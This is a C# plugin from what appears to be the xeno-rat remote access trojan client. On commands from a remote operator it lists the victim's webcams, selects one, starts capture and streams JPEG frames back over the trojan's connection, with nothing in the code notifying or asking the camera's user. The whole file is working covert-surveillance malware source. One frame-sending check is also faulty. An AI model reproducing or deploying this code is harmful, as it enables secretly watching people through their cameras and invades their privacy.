using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        VideoCaptureDevice videoSource;
        FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        string monkier = "";
        int quality = 70;
        bool playing = false;
        Node ImageNode;
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (videoDevices.Count > 0) 
            {
                monkier = videoDevices[0].MonikerString;
            }
            try
            {
                await RecvThread(node);
            }
            catch 
            {
                ImageNode?.Disconnect();
                node.Disconnect();
                videoSource?.SignalToStop();
            }
            GC.Collect();
        }
        public async void Capture(object sender, NewFrameEventArgs eventArgs)
        {
            if (playing)
            {
                byte[] frameBytes;
                using (var stream = new System.IO.MemoryStream())
                {
                    var qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                    var jpegEncoder = GetEncoderInfo(ImageFormat.Jpeg);

                    var encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = qualityParam;

                    eventArgs.Frame.Save(stream, jpegEncoder, encoderParams);
                    frameBytes = stream.ToArray();
                }
                if (ImageNode != null || frameBytes == null)
                {
                    await ImageNode.SendAsync(frameBytes);
                }
            }
        }

        private ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageEncoders();
            foreach (var codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        public async Task RecvThread(Node node) 
        {
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null)
                {
                    ImageNode?.Disconnect();
                    break;
                }
                if (data[0] == 0)
                {
                    videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    await node.SendAsync(node.sock.IntToBytes(videoDevices.Count));
                    foreach (FilterInfo i in videoDevices)
                    {
                        await node.SendAsync(Encoding.UTF8.GetBytes(i.Name));
                    }
                }
                else if (data[0] == 1)
                {
                    int index = node.sock.BytesToInt(await node.ReceiveAsync());
                    monkier = videoDevices[index].MonikerString;
                }
                else if (data[0] == 2)
                {
                    videoSource?.SignalToStop();
                    videoSource?.WaitForStop();
                    if (monkier == "")
                    {
                        playing = false;
                        return;
                    }
                    playing = true;
                    videoSource = new VideoCaptureDevice(monkier);
                    videoSource.NewFrame += Capture;
                    videoSource.Start();
                }
                else if (data[0] == 3)
                {
                    videoSource?.SignalToStop();
                    videoSource?.WaitForStop();
                    playing = false;
                }
                else if (data[0] == 4)
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        ImageNode = tempnode;
                    }
                    else
                    {
                        break;
                    }
                }
                else if (data[0] == 5) 
                {
                    quality = node.sock.BytesToInt(await node.ReceiveAsync());
                }
            }
        }
    }
}
